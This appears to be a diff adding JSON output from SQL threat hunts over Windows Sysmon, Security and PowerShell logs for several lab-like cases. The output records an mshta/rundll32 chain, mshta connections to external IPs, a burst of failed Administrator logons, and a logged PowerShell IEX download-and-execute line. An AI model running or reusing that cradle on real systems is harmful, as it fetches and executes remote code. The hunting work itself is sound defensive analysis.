@@ -1,0 +1,751 @@
+{
+  "case-001": {
+    "event_count": 8,
+    "source_sha256": [
+      "c05ae5276b05021443a237ad8c4b4985f1a12e3e015a4f7a99d0eaa3b724115c"
+    ],
+    "hunts": [
+      {
+        "id": "HUNT-01",
+        "hypothesis": "Which process parents deserve review in this collection?",
+        "query": "SELECT json_extract(event_data,'$.ParentImage') AS parent, json_extract(event_data,'$.Image') AS child, COUNT(*) AS observations FROM events WHERE event_id=1 AND lower(provider)='microsoft-windows-sysmon' GROUP BY parent,child ORDER BY observations,parent,child LIMIT 100",
+        "query_sha256": "64c3ffd5c274970ea4a2d67ff586e9d91cf4bc83a8c06088579e771fa94c4ce3",
+        "rows": [
+          {
+            "parent": "C:\\Windows\\System32\\cmd.exe",
+            "child": "C:\\Windows\\System32\\cmd.exe",
+            "observations": 1
+          },
+          {
+            "parent": "C:\\Windows\\System32\\cmd.exe",
+            "child": "C:\\Windows\\System32\\rundll32.exe",
+            "observations": 1
+          },
+          {
+            "parent": "C:\\Windows\\System32\\mshta.exe",
+            "child": "C:\\Windows\\System32\\schtasks.exe",
+            "observations": 1
+          },
+          {
+            "parent": "C:\\Windows\\System32\\rundll32.exe",
+            "child": "C:\\Windows\\System32\\mshta.exe",
+            "observations": 1
+          }
+        ],
+        "returned_rows": 4,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Rarity is relative to this small collection, not an enterprise baseline."
+      },
+      {
+        "id": "HUNT-02",
+        "hypothesis": "Do observed process GUIDs link to network activity?",
+        "query": "SELECT c.event_uid AS creation_uid,n.event_uid AS network_uid,c.host,json_extract(c.event_data,'$.Image') AS image,json_extract(n.event_data,'$.DestinationIp') AS destination,json_extract(n.event_data,'$.Initiated') AS initiated FROM events c JOIN events n ON lower(c.host)=lower(n.host) AND lower(json_extract(c.event_data,'$.ProcessGuid'))=lower(json_extract(n.event_data,'$.ProcessGuid')) AND n.timestamp>=c.timestamp WHERE c.event_id=1 AND n.event_id=3 AND lower(c.provider)='microsoft-windows-sysmon' AND lower(n.provider)='microsoft-windows-sysmon' AND length(json_extract(c.event_data,'$.ProcessGuid'))=38 AND lower(json_extract(c.event_data,'$.ProcessGuid'))<>'{00000000-0000-0000-0000-000000000000}' LIMIT 100",
+        "query_sha256": "3e8d48b015c49d047d25f22a1a6060d2a7ce24aee89ed3b4bfd42b1534bb4b90",
+        "rows": [
+          {
+            "creation_uid": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+            "network_uid": "4da9dabc1159199db487dc43717d12ef500cb4acbac4b3cc42d9c4d4105e4d19",
+            "host": "IEWIN7",
+            "image": "C:\\Windows\\System32\\mshta.exe",
+            "destination": "108.179.232.58",
+            "initiated": "true"
+          },
+          {
+            "creation_uid": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+            "network_uid": "d3fca0276ddda43c44e14013887c9b0f2360ea803fed40825bf94ea95bac97dd",
+            "host": "IEWIN7",
+            "image": "C:\\Windows\\System32\\mshta.exe",
+            "destination": "105.73.6.112",
+            "initiated": "true"
+          },
+          {
+            "creation_uid": "15a1e1c9e13cef6ee14bad7dea829a0eb8f89ff3604f777c8b20a379d2b6dad7",
+            "network_uid": "5a08c74a73ec7f369de04ecf8a188993c71e64fc46eee1eb570d808cabc00110",
+            "host": "IEWIN7",
+            "image": "C:\\Windows\\System32\\mshta.exe",
+            "destination": "105.73.6.105",
+            "initiated": "true"
+          }
+        ],
+        "returned_rows": 3,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "This hunt proposes exact GUID pivots. The graph engine additionally validates UUID syntax and conflicting creation records."
+      },
+      {
+        "id": "HUNT-03",
+        "hypothesis": "Which account/IP pairs dominate failed logons?",
+        "query": "SELECT host,json_extract(event_data,'$.TargetDomainName') AS domain,json_extract(event_data,'$.TargetUserName') AS account,json_extract(event_data,'$.IpAddress') AS ip,json_extract(event_data,'$.SubStatus') AS sub_status,COUNT(*) AS failures FROM events WHERE event_id=4625 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,domain,account,ip,sub_status ORDER BY failures DESC LIMIT 100",
+        "query_sha256": "292c5af73f00e87cf7b154a4ba7bb4d66f748b58bb700659585fa8b7ad4a3250",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Failed authentication alone does not prove successful access; source scope and failure reasons matter."
+      },
+      {
+        "id": "HUNT-04",
+        "hypothesis": "Is task registration present as its own observation?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.TaskName') AS task_name,json_extract(event_data,'$.TaskContent') AS task_xml FROM events WHERE event_id=4698 AND lower(provider)='microsoft-windows-security-auditing' LIMIT 100",
+        "query_sha256": "5d69bec6ac796ebbaf4dd9c4bb622c675a8c9e41fd1048d368c66c471757bb67",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Task XML is retained as text. Registration does not prove that a task ran."
+      },
+      {
+        "id": "HUNT-05",
+        "hypothesis": "Which script-block fragments are actually collected?",
+        "query": "SELECT event_uid,host,json_extract(event_data,'$.ScriptBlockId') AS block_id,json_extract(event_data,'$.MessageNumber') AS part,json_extract(event_data,'$.MessageTotal') AS total,json_extract(event_data,'$.ScriptBlockText') AS text FROM events WHERE event_id=4104 AND lower(provider)='microsoft-windows-powershell' LIMIT 100",
+        "query_sha256": "ee61dbed4564ff6d0cec45c2829898de578647575aaa6d299fd5ad81798f6851",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Use reconstruction and static AST inspection before interpreting keyword matches as behavior."
+      },
+      {
+        "id": "HUNT-06",
+        "hypothesis": "Which subjects use explicit credentials for distinct targets?",
+        "query": "SELECT host,json_extract(event_data,'$.SubjectDomainName') AS subject_domain,json_extract(event_data,'$.SubjectUserName') AS subject,json_extract(event_data,'$.TargetServerName') AS target_server,COUNT(DISTINCT lower(COALESCE(json_extract(event_data,'$.TargetDomainName'),'')||'\\'||COALESCE(json_extract(event_data,'$.TargetUserName'),''))) AS distinct_target_users,COUNT(*) AS observations FROM events WHERE event_id=4648 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,subject_domain,subject,target_server ORDER BY distinct_target_users DESC LIMIT 100",
+        "query_sha256": "17a20e1f4a3b78cd6788cce339fc4afa8aab1acc2b12bbe0047425d1d1c6cef0",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Explicit credentials can be authorized administration. This aggregate does not establish password spraying."
+      },
+      {
+        "id": "HUNT-07",
+        "hypothesis": "Was Security logging cleared within the collected file?",
+        "query": "SELECT event_uid,timestamp,host,event_data FROM events WHERE event_id=1102 AND lower(channel)='security' LIMIT 100",
+        "query_sha256": "3723091184367cf79c7f728f1efaaa535d0cb117c7e66ea4a58ed7c1cbb647d6",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Investigate maintenance context. Missing 1102 in a narrow sample is not proof logging remained intact."
+      },
+      {
+        "id": "HUNT-08",
+        "hypothesis": "Are registry persistence leads present?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.Image') AS image,json_extract(event_data,'$.TargetObject') AS target,json_extract(event_data,'$.Details') AS details FROM events WHERE event_id=13 AND lower(provider)='microsoft-windows-sysmon' LIMIT 100",
+        "query_sha256": "465a08e599d7c2afc9ca8005d8e8df296eedf299cc26ddb95d60ea3976dac296",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Registry writes require key/value and authorization review. Zero hits may reflect missing telemetry."
+      }
+    ],
+    "scope": "Independent case collection; all SQL executed read-only; results capped at 100 rows per hunt"
+  },
+  "case-002": {
+    "event_count": 3561,
+    "source_sha256": [
+      "f313a4c96b39e3fa8ffb4c61a99461996b3f22c4c4108ef981ba257d1470cedc"
+    ],
+    "hunts": [
+      {
+        "id": "HUNT-01",
+        "hypothesis": "Which process parents deserve review in this collection?",
+        "query": "SELECT json_extract(event_data,'$.ParentImage') AS parent, json_extract(event_data,'$.Image') AS child, COUNT(*) AS observations FROM events WHERE event_id=1 AND lower(provider)='microsoft-windows-sysmon' GROUP BY parent,child ORDER BY observations,parent,child LIMIT 100",
+        "query_sha256": "64c3ffd5c274970ea4a2d67ff586e9d91cf4bc83a8c06088579e771fa94c4ce3",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Rarity is relative to this small collection, not an enterprise baseline."
+      },
+      {
+        "id": "HUNT-02",
+        "hypothesis": "Do observed process GUIDs link to network activity?",
+        "query": "SELECT c.event_uid AS creation_uid,n.event_uid AS network_uid,c.host,json_extract(c.event_data,'$.Image') AS image,json_extract(n.event_data,'$.DestinationIp') AS destination,json_extract(n.event_data,'$.Initiated') AS initiated FROM events c JOIN events n ON lower(c.host)=lower(n.host) AND lower(json_extract(c.event_data,'$.ProcessGuid'))=lower(json_extract(n.event_data,'$.ProcessGuid')) AND n.timestamp>=c.timestamp WHERE c.event_id=1 AND n.event_id=3 AND lower(c.provider)='microsoft-windows-sysmon' AND lower(n.provider)='microsoft-windows-sysmon' AND length(json_extract(c.event_data,'$.ProcessGuid'))=38 AND lower(json_extract(c.event_data,'$.ProcessGuid'))<>'{00000000-0000-0000-0000-000000000000}' LIMIT 100",
+        "query_sha256": "3e8d48b015c49d047d25f22a1a6060d2a7ce24aee89ed3b4bfd42b1534bb4b90",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "This hunt proposes exact GUID pivots. The graph engine additionally validates UUID syntax and conflicting creation records."
+      },
+      {
+        "id": "HUNT-03",
+        "hypothesis": "Which account/IP pairs dominate failed logons?",
+        "query": "SELECT host,json_extract(event_data,'$.TargetDomainName') AS domain,json_extract(event_data,'$.TargetUserName') AS account,json_extract(event_data,'$.IpAddress') AS ip,json_extract(event_data,'$.SubStatus') AS sub_status,COUNT(*) AS failures FROM events WHERE event_id=4625 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,domain,account,ip,sub_status ORDER BY failures DESC LIMIT 100",
+        "query_sha256": "292c5af73f00e87cf7b154a4ba7bb4d66f748b58bb700659585fa8b7ad4a3250",
+        "rows": [
+          {
+            "host": "DESKTOP-M5SN04R",
+            "domain": ".",
+            "account": "Administrator",
+            "ip": "192.168.198.149",
+            "sub_status": "0xc000006a",
+            "failures": 3558
+          },
+          {
+            "host": "DESKTOP-M5SN04R",
+            "domain": ".",
+            "account": "Administrator",
+            "ip": "192.168.198.149",
+            "sub_status": "0xc0000072",
+            "failures": 1
+          },
+          {
+            "host": "DESKTOP-M5SN04R",
+            "domain": ".",
+            "account": "JcDfcZTc",
+            "ip": "192.168.198.149",
+            "sub_status": "0xc0000064",
+            "failures": 1
+          },
+          {
+            "host": "DESKTOP-M5SN04R",
+            "domain": "lXMrIIDU",
+            "account": "Administrator",
+            "ip": "192.168.198.149",
+            "sub_status": "0xc0000072",
+            "failures": 1
+          }
+        ],
+        "returned_rows": 4,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Failed authentication alone does not prove successful access; source scope and failure reasons matter."
+      },
+      {
+        "id": "HUNT-04",
+        "hypothesis": "Is task registration present as its own observation?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.TaskName') AS task_name,json_extract(event_data,'$.TaskContent') AS task_xml FROM events WHERE event_id=4698 AND lower(provider)='microsoft-windows-security-auditing' LIMIT 100",
+        "query_sha256": "5d69bec6ac796ebbaf4dd9c4bb622c675a8c9e41fd1048d368c66c471757bb67",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Task XML is retained as text. Registration does not prove that a task ran."
+      },
+      {
+        "id": "HUNT-05",
+        "hypothesis": "Which script-block fragments are actually collected?",
+        "query": "SELECT event_uid,host,json_extract(event_data,'$.ScriptBlockId') AS block_id,json_extract(event_data,'$.MessageNumber') AS part,json_extract(event_data,'$.MessageTotal') AS total,json_extract(event_data,'$.ScriptBlockText') AS text FROM events WHERE event_id=4104 AND lower(provider)='microsoft-windows-powershell' LIMIT 100",
+        "query_sha256": "ee61dbed4564ff6d0cec45c2829898de578647575aaa6d299fd5ad81798f6851",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Use reconstruction and static AST inspection before interpreting keyword matches as behavior."
+      },
+      {
+        "id": "HUNT-06",
+        "hypothesis": "Which subjects use explicit credentials for distinct targets?",
+        "query": "SELECT host,json_extract(event_data,'$.SubjectDomainName') AS subject_domain,json_extract(event_data,'$.SubjectUserName') AS subject,json_extract(event_data,'$.TargetServerName') AS target_server,COUNT(DISTINCT lower(COALESCE(json_extract(event_data,'$.TargetDomainName'),'')||'\\'||COALESCE(json_extract(event_data,'$.TargetUserName'),''))) AS distinct_target_users,COUNT(*) AS observations FROM events WHERE event_id=4648 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,subject_domain,subject,target_server ORDER BY distinct_target_users DESC LIMIT 100",
+        "query_sha256": "17a20e1f4a3b78cd6788cce339fc4afa8aab1acc2b12bbe0047425d1d1c6cef0",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Explicit credentials can be authorized administration. This aggregate does not establish password spraying."
+      },
+      {
+        "id": "HUNT-07",
+        "hypothesis": "Was Security logging cleared within the collected file?",
+        "query": "SELECT event_uid,timestamp,host,event_data FROM events WHERE event_id=1102 AND lower(channel)='security' LIMIT 100",
+        "query_sha256": "3723091184367cf79c7f728f1efaaa535d0cb117c7e66ea4a58ed7c1cbb647d6",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Investigate maintenance context. Missing 1102 in a narrow sample is not proof logging remained intact."
+      },
+      {
+        "id": "HUNT-08",
+        "hypothesis": "Are registry persistence leads present?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.Image') AS image,json_extract(event_data,'$.TargetObject') AS target,json_extract(event_data,'$.Details') AS details FROM events WHERE event_id=13 AND lower(provider)='microsoft-windows-sysmon' LIMIT 100",
+        "query_sha256": "465a08e599d7c2afc9ca8005d8e8df296eedf299cc26ddb95d60ea3976dac296",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Registry writes require key/value and authorization review. Zero hits may reflect missing telemetry."
+      }
+    ],
+    "scope": "Independent case collection; all SQL executed read-only; results capped at 100 rows per hunt"
+  },
+  "case-003": {
+    "event_count": 3,
+    "source_sha256": [
+      "6600320605ea89b7a354be24e839d146b2a82d5783ae7ad67b207bedfec5b920"
+    ],
+    "hunts": [
+      {
+        "id": "HUNT-01",
+        "hypothesis": "Which process parents deserve review in this collection?",
+        "query": "SELECT json_extract(event_data,'$.ParentImage') AS parent, json_extract(event_data,'$.Image') AS child, COUNT(*) AS observations FROM events WHERE event_id=1 AND lower(provider)='microsoft-windows-sysmon' GROUP BY parent,child ORDER BY observations,parent,child LIMIT 100",
+        "query_sha256": "64c3ffd5c274970ea4a2d67ff586e9d91cf4bc83a8c06088579e771fa94c4ce3",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Rarity is relative to this small collection, not an enterprise baseline."
+      },
+      {
+        "id": "HUNT-02",
+        "hypothesis": "Do observed process GUIDs link to network activity?",
+        "query": "SELECT c.event_uid AS creation_uid,n.event_uid AS network_uid,c.host,json_extract(c.event_data,'$.Image') AS image,json_extract(n.event_data,'$.DestinationIp') AS destination,json_extract(n.event_data,'$.Initiated') AS initiated FROM events c JOIN events n ON lower(c.host)=lower(n.host) AND lower(json_extract(c.event_data,'$.ProcessGuid'))=lower(json_extract(n.event_data,'$.ProcessGuid')) AND n.timestamp>=c.timestamp WHERE c.event_id=1 AND n.event_id=3 AND lower(c.provider)='microsoft-windows-sysmon' AND lower(n.provider)='microsoft-windows-sysmon' AND length(json_extract(c.event_data,'$.ProcessGuid'))=38 AND lower(json_extract(c.event_data,'$.ProcessGuid'))<>'{00000000-0000-0000-0000-000000000000}' LIMIT 100",
+        "query_sha256": "3e8d48b015c49d047d25f22a1a6060d2a7ce24aee89ed3b4bfd42b1534bb4b90",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "This hunt proposes exact GUID pivots. The graph engine additionally validates UUID syntax and conflicting creation records."
+      },
+      {
+        "id": "HUNT-03",
+        "hypothesis": "Which account/IP pairs dominate failed logons?",
+        "query": "SELECT host,json_extract(event_data,'$.TargetDomainName') AS domain,json_extract(event_data,'$.TargetUserName') AS account,json_extract(event_data,'$.IpAddress') AS ip,json_extract(event_data,'$.SubStatus') AS sub_status,COUNT(*) AS failures FROM events WHERE event_id=4625 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,domain,account,ip,sub_status ORDER BY failures DESC LIMIT 100",
+        "query_sha256": "292c5af73f00e87cf7b154a4ba7bb4d66f748b58bb700659585fa8b7ad4a3250",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Failed authentication alone does not prove successful access; source scope and failure reasons matter."
+      },
+      {
+        "id": "HUNT-04",
+        "hypothesis": "Is task registration present as its own observation?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.TaskName') AS task_name,json_extract(event_data,'$.TaskContent') AS task_xml FROM events WHERE event_id=4698 AND lower(provider)='microsoft-windows-security-auditing' LIMIT 100",
+        "query_sha256": "5d69bec6ac796ebbaf4dd9c4bb622c675a8c9e41fd1048d368c66c471757bb67",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Task XML is retained as text. Registration does not prove that a task ran."
+      },
+      {
+        "id": "HUNT-05",
+        "hypothesis": "Which script-block fragments are actually collected?",
+        "query": "SELECT event_uid,host,json_extract(event_data,'$.ScriptBlockId') AS block_id,json_extract(event_data,'$.MessageNumber') AS part,json_extract(event_data,'$.MessageTotal') AS total,json_extract(event_data,'$.ScriptBlockText') AS text FROM events WHERE event_id=4104 AND lower(provider)='microsoft-windows-powershell' LIMIT 100",
+        "query_sha256": "ee61dbed4564ff6d0cec45c2829898de578647575aaa6d299fd5ad81798f6851",
+        "rows": [
+          {
+            "event_uid": "207cb97c427683bd4a6932c68a4ab823edf3327a0e495c082851f6b439194865",
+            "host": "fs03vuln.offsec.lan",
+            "block_id": "965150b4-b107-4cce-9d30-1d3c55a8a085",
+            "part": "1",
+            "total": "1",
+            "text": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\""
+          },
+          {
+            "event_uid": "783ce43a5f5c6e4d4a623940bb4c8bb86e73391a94b017ea57cceeffb62f9c4f",
+            "host": "fs03vuln.offsec.lan",
+            "block_id": "63d67bc9-5a54-4394-8b23-363e369f3c91",
+            "part": "1",
+            "total": "1",
+            "text": "prompt"
+          }
+        ],
+        "returned_rows": 2,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Use reconstruction and static AST inspection before interpreting keyword matches as behavior."
+      },
+      {
+        "id": "HUNT-06",
+        "hypothesis": "Which subjects use explicit credentials for distinct targets?",
+        "query": "SELECT host,json_extract(event_data,'$.SubjectDomainName') AS subject_domain,json_extract(event_data,'$.SubjectUserName') AS subject,json_extract(event_data,'$.TargetServerName') AS target_server,COUNT(DISTINCT lower(COALESCE(json_extract(event_data,'$.TargetDomainName'),'')||'\\'||COALESCE(json_extract(event_data,'$.TargetUserName'),''))) AS distinct_target_users,COUNT(*) AS observations FROM events WHERE event_id=4648 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,subject_domain,subject,target_server ORDER BY distinct_target_users DESC LIMIT 100",
+        "query_sha256": "17a20e1f4a3b78cd6788cce339fc4afa8aab1acc2b12bbe0047425d1d1c6cef0",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Explicit credentials can be authorized administration. This aggregate does not establish password spraying."
+      },
+      {
+        "id": "HUNT-07",
+        "hypothesis": "Was Security logging cleared within the collected file?",
+        "query": "SELECT event_uid,timestamp,host,event_data FROM events WHERE event_id=1102 AND lower(channel)='security' LIMIT 100",
+        "query_sha256": "3723091184367cf79c7f728f1efaaa535d0cb117c7e66ea4a58ed7c1cbb647d6",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Investigate maintenance context. Missing 1102 in a narrow sample is not proof logging remained intact."
+      },
+      {
+        "id": "HUNT-08",
+        "hypothesis": "Are registry persistence leads present?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.Image') AS image,json_extract(event_data,'$.TargetObject') AS target,json_extract(event_data,'$.Details') AS details FROM events WHERE event_id=13 AND lower(provider)='microsoft-windows-sysmon' LIMIT 100",
+        "query_sha256": "465a08e599d7c2afc9ca8005d8e8df296eedf299cc26ddb95d60ea3976dac296",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Registry writes require key/value and authorization review. Zero hits may reflect missing telemetry."
+      }
+    ],
+    "scope": "Independent case collection; all SQL executed read-only; results capped at 100 rows per hunt"
+  },
+  "case-004": {
+    "event_count": 4,
+    "source_sha256": [
+      "d907c25a6a0ab6a9ca78bae43fc633cdde7e3c470e1e985c607c5b213b8ed490"
+    ],
+    "hunts": [
+      {
+        "id": "HUNT-01",
+        "hypothesis": "Which process parents deserve review in this collection?",
+        "query": "SELECT json_extract(event_data,'$.ParentImage') AS parent, json_extract(event_data,'$.Image') AS child, COUNT(*) AS observations FROM events WHERE event_id=1 AND lower(provider)='microsoft-windows-sysmon' GROUP BY parent,child ORDER BY observations,parent,child LIMIT 100",
+        "query_sha256": "64c3ffd5c274970ea4a2d67ff586e9d91cf4bc83a8c06088579e771fa94c4ce3",
+        "rows": [
+          {
+            "parent": "C:\\Windows\\explorer.exe",
+            "child": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "observations": 1
+          },
+          {
+            "parent": "C:\\Windows\\System32\\taskeng.exe",
+            "child": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "observations": 3
+          }
+        ],
+        "returned_rows": 2,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Rarity is relative to this small collection, not an enterprise baseline."
+      },
+      {
+        "id": "HUNT-02",
+        "hypothesis": "Do observed process GUIDs link to network activity?",
+        "query": "SELECT c.event_uid AS creation_uid,n.event_uid AS network_uid,c.host,json_extract(c.event_data,'$.Image') AS image,json_extract(n.event_data,'$.DestinationIp') AS destination,json_extract(n.event_data,'$.Initiated') AS initiated FROM events c JOIN events n ON lower(c.host)=lower(n.host) AND lower(json_extract(c.event_data,'$.ProcessGuid'))=lower(json_extract(n.event_data,'$.ProcessGuid')) AND n.timestamp>=c.timestamp WHERE c.event_id=1 AND n.event_id=3 AND lower(c.provider)='microsoft-windows-sysmon' AND lower(n.provider)='microsoft-windows-sysmon' AND length(json_extract(c.event_data,'$.ProcessGuid'))=38 AND lower(json_extract(c.event_data,'$.ProcessGuid'))<>'{00000000-0000-0000-0000-000000000000}' LIMIT 100",
+        "query_sha256": "3e8d48b015c49d047d25f22a1a6060d2a7ce24aee89ed3b4bfd42b1534bb4b90",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "This hunt proposes exact GUID pivots. The graph engine additionally validates UUID syntax and conflicting creation records."
+      },
+      {
+        "id": "HUNT-03",
+        "hypothesis": "Which account/IP pairs dominate failed logons?",
+        "query": "SELECT host,json_extract(event_data,'$.TargetDomainName') AS domain,json_extract(event_data,'$.TargetUserName') AS account,json_extract(event_data,'$.IpAddress') AS ip,json_extract(event_data,'$.SubStatus') AS sub_status,COUNT(*) AS failures FROM events WHERE event_id=4625 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,domain,account,ip,sub_status ORDER BY failures DESC LIMIT 100",
+        "query_sha256": "292c5af73f00e87cf7b154a4ba7bb4d66f748b58bb700659585fa8b7ad4a3250",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Failed authentication alone does not prove successful access; source scope and failure reasons matter."
+      },
+      {
+        "id": "HUNT-04",
+        "hypothesis": "Is task registration present as its own observation?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.TaskName') AS task_name,json_extract(event_data,'$.TaskContent') AS task_xml FROM events WHERE event_id=4698 AND lower(provider)='microsoft-windows-security-auditing' LIMIT 100",
+        "query_sha256": "5d69bec6ac796ebbaf4dd9c4bb622c675a8c9e41fd1048d368c66c471757bb67",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Task XML is retained as text. Registration does not prove that a task ran."
+      },
+      {
+        "id": "HUNT-05",
+        "hypothesis": "Which script-block fragments are actually collected?",
+        "query": "SELECT event_uid,host,json_extract(event_data,'$.ScriptBlockId') AS block_id,json_extract(event_data,'$.MessageNumber') AS part,json_extract(event_data,'$.MessageTotal') AS total,json_extract(event_data,'$.ScriptBlockText') AS text FROM events WHERE event_id=4104 AND lower(provider)='microsoft-windows-powershell' LIMIT 100",
+        "query_sha256": "ee61dbed4564ff6d0cec45c2829898de578647575aaa6d299fd5ad81798f6851",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Use reconstruction and static AST inspection before interpreting keyword matches as behavior."
+      },
+      {
+        "id": "HUNT-06",
+        "hypothesis": "Which subjects use explicit credentials for distinct targets?",
+        "query": "SELECT host,json_extract(event_data,'$.SubjectDomainName') AS subject_domain,json_extract(event_data,'$.SubjectUserName') AS subject,json_extract(event_data,'$.TargetServerName') AS target_server,COUNT(DISTINCT lower(COALESCE(json_extract(event_data,'$.TargetDomainName'),'')||'\\'||COALESCE(json_extract(event_data,'$.TargetUserName'),''))) AS distinct_target_users,COUNT(*) AS observations FROM events WHERE event_id=4648 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,subject_domain,subject,target_server ORDER BY distinct_target_users DESC LIMIT 100",
+        "query_sha256": "17a20e1f4a3b78cd6788cce339fc4afa8aab1acc2b12bbe0047425d1d1c6cef0",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Explicit credentials can be authorized administration. This aggregate does not establish password spraying."
+      },
+      {
+        "id": "HUNT-07",
+        "hypothesis": "Was Security logging cleared within the collected file?",
+        "query": "SELECT event_uid,timestamp,host,event_data FROM events WHERE event_id=1102 AND lower(channel)='security' LIMIT 100",
+        "query_sha256": "3723091184367cf79c7f728f1efaaa535d0cb117c7e66ea4a58ed7c1cbb647d6",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Investigate maintenance context. Missing 1102 in a narrow sample is not proof logging remained intact."
+      },
+      {
+        "id": "HUNT-08",
+        "hypothesis": "Are registry persistence leads present?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.Image') AS image,json_extract(event_data,'$.TargetObject') AS target,json_extract(event_data,'$.Details') AS details FROM events WHERE event_id=13 AND lower(provider)='microsoft-windows-sysmon' LIMIT 100",
+        "query_sha256": "465a08e599d7c2afc9ca8005d8e8df296eedf299cc26ddb95d60ea3976dac296",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Registry writes require key/value and authorization review. Zero hits may reflect missing telemetry."
+      }
+    ],
+    "scope": "Independent case collection; all SQL executed read-only; results capped at 100 rows per hunt"
+  },
+  "case-005": {
+    "event_count": 2511,
+    "source_sha256": [
+      "6d5bcfc49f313e1a3dc732b496c565ff36923e6902622c43e2632bc98b4466cb",
+      "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+      "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"
+    ],
+    "hunts": [
+      {
+        "id": "HUNT-01",
+        "hypothesis": "Which process parents deserve review in this collection?",
+        "query": "SELECT json_extract(event_data,'$.ParentImage') AS parent, json_extract(event_data,'$.Image') AS child, COUNT(*) AS observations FROM events WHERE event_id=1 AND lower(provider)='microsoft-windows-sysmon' GROUP BY parent,child ORDER BY observations,parent,child LIMIT 100",
+        "query_sha256": "64c3ffd5c274970ea4a2d67ff586e9d91cf4bc83a8c06088579e771fa94c4ce3",
+        "rows": [
+          {
+            "parent": null,
+            "child": "C:\\Windows\\System32\\cmd.exe",
+            "observations": 1
+          },
+          {
+            "parent": null,
+            "child": "C:\\Windows\\System32\\mshta.exe",
+            "observations": 1
+          },
+          {
